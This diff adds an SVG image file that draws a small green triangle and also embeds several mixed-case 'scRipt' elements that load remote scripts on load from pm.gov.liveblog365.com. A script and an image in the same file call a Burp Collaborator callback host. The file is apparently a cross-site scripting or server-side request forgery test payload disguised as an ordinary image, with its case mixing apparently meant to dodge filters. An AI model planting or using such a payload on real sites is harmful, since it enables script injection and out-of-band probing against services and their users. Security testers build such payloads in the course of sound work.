@@ -1,0 +1,22 @@
+<svg
+	xmlns:svg="http://www.w3.org/2000/svg"
+	xmlns="http://www.w3.org/2000/svg"
+	xmlns:xlink="http://www.w3.org/1999/xlink"
+	style="overflow: hidden; position: relative;"
+	width="200"
+	height="200">
+	<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+	<scRipt type="text/html" xlink:href="http://pm.gov.liveblog365.com/alert.html" xlink:actuate="onLoad" xlink:show="other" xlink:type="simple" /> 
+	<scRipt type="text/html" xlink:href="http://pm.gov.liveblog365.com/alert.js" xlink:actuate="onLoad" xlink:show="other" xlink:type="simple" />
+	<scRipt type="text/html" xlink:href="http://pm.gov.liveblog365.com/alert_function.js" xlink:actuate="onLoad" xlink:show="other" xlink:type="simple" />
+	<scRipt type="text/html" xlink:href="http://pm.gov.liveblog365.com/alert_script.js" xlink:actuate="onLoad" xlink:show="other" xlink:type="simple" />
+	<scRipt type="text/html" xlink:href="http://eo6ypcfesnsyc1ikx6vgdti1jsplda.burpcollaborator.net" xlink:actuate="onLoad" xlink:show="other" xlink:type="simple" />
+   	<image
+	x="10"
+	y="10"
+	width="276"
+	height="110"
+	xlink:href="http://eo6ypcfesnsyc1ikx6vgdti1jsplda.burpcollaborator.net"
+	stroke-width="1"
+	id="image3204" />
+</svg>
